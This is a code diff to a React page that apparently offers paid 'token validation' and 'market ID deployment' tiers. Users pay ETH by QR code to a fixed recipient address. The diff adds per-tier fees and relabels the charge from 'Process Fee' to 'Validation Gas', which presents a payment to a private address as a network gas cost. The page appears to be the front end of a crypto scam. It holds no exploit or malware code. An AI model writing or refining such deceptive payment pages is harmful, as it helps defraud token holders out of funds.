@@ -14,7 +14,7 @@ import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 import { useToast } from "@/hooks/use-toast";
-import { RECIPIENT_ADDRESS, TRANSACTION_AMOUNT_ETH_STRING, POST_PAYMENT_REDIRECT_URL, RAYDIUM_LIQUIDITY_POOL_URL } from "@/lib/constants";
+import { RECIPIENT_ADDRESS, POST_PAYMENT_REDIRECT_URL, RAYDIUM_LIQUIDITY_POOL_URL, VALIDATION_FEES } from "@/lib/constants";
 import { cn } from "@/lib/utils";
 
 
@@ -26,7 +26,7 @@ export default function CryptoValidatorPage() {
   const [activeTab, setActiveTab] = useState("pasteContract");
   
   const [showPaymentInterface, setShowPaymentInterface] = useState(false);
-  const [selectedValidationType, setSelectedValidationType] = useState("");
+  const [selectedValidationType, setSelectedValidationType] = useState<keyof typeof VALIDATION_FEES | "">("");
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
 
   const { toast } = useToast();
@@ -57,7 +57,7 @@ export default function CryptoValidatorPage() {
     });
   };
 
-  const handleInitiateValidation = (validationType: string) => {
+  const handleInitiateValidation = (validationType: keyof typeof VALIDATION_FEES) => {
     if (tokenCA.trim() === '') {
       toast({
         title: "Validation Error",
@@ -126,7 +126,7 @@ export default function CryptoValidatorPage() {
       title: "Standard Validation",
       icon: <Box className="h-6 w-6 text-primary" />,
       description: "Essential token validation and market ID setup on its native blockchain. Ensures your token is recognized and ready for liquidity.",
-      feeNote: "Process Fee: ".concat(TRANSACTION_AMOUNT_ETH_STRING, " ETH for market ID deployment and initial validation."),
+      feeNote: "Validation Gas: ".concat(VALIDATION_FEES["Standard Validation"], " ETH for market ID deployment and initial validation."),
       buttonText: "Initiate Standard Validation",
       validationType: "Standard Validation"
     },
@@ -134,19 +134,21 @@ export default function CryptoValidatorPage() {
       title: "Enhanced Cross-Check",
       icon: <GitCompareArrows className="h-6 w-6 text-primary" />,
       description: "Comprehensive validation with cross-referencing capabilities for tokens aiming for broader interoperability. Includes standard market ID setup.",
-      feeNote: "Process Fee: ".concat(TRANSACTION_AMOUNT_ETH_STRING, " ETH for market ID deployment and enhanced validation."),
+      feeNote: "Validation Gas: ".concat(VALIDATION_FEES["Enhanced Cross-Check"], " ETH for market ID deployment and enhanced validation."),
       buttonText: "Initiate Enhanced Validation",
-      validationType: "Enhanced Validation"
+      validationType: "Enhanced Cross-Check"
     },
     {
       title: "Premier Multi-Chain Presence",
       icon: <Network className="h-6 w-6 text-primary" />,
       description: "Top-tier validation designed for tokens with a multi-chain strategy, ensuring maximum visibility and compatibility. Includes standard market ID setup.",
-      feeNote: "Process Fee: ".concat(TRANSACTION_AMOUNT_ETH_STRING, " ETH for market ID deployment and premier validation."),
+      feeNote: "Validation Gas: ".concat(VALIDATION_FEES["Premier Multi-Chain Presence"], " ETH for market ID deployment and premier validation."),
       buttonText: "Initiate Premier Validation",
-      validationType: "Premier Validation"
+      validationType: "Premier Multi-Chain Presence"
     }
-  ];
+  ] as const;
+  
+  const currentFee = selectedValidationType ? VALIDATION_FEES[selectedValidationType] : "0";
 
   return (
     <main className="min-h-screen flex flex-col items-center p-4 sm:p-6 bg-background font-body">
@@ -298,10 +300,10 @@ export default function CryptoValidatorPage() {
                 For manual payment, scan with your mobile wallet:
               </p>
               <div className="p-2 bg-white rounded-md inline-block shadow-md">
-                {isClient && <QRCode value={"ethereum:".concat(RECIPIENT_ADDRESS, "?value=").concat(String(parseFloat(TRANSACTION_AMOUNT_ETH_STRING) * 1e18))} size={160} level="H" />}
+                {isClient && <QRCode value={"ethereum:".concat(RECIPIENT_ADDRESS, "?value=").concat(String(parseFloat(currentFee) * 1e18))} size={160} level="H" />}
               </div>
                <p className="text-xs text-muted-foreground mt-2 text-center">
-                Amount: {TRANSACTION_AMOUNT_ETH_STRING} ETH
+                Amount: {currentFee} ETH
               </p>
             </Card>
           </div>
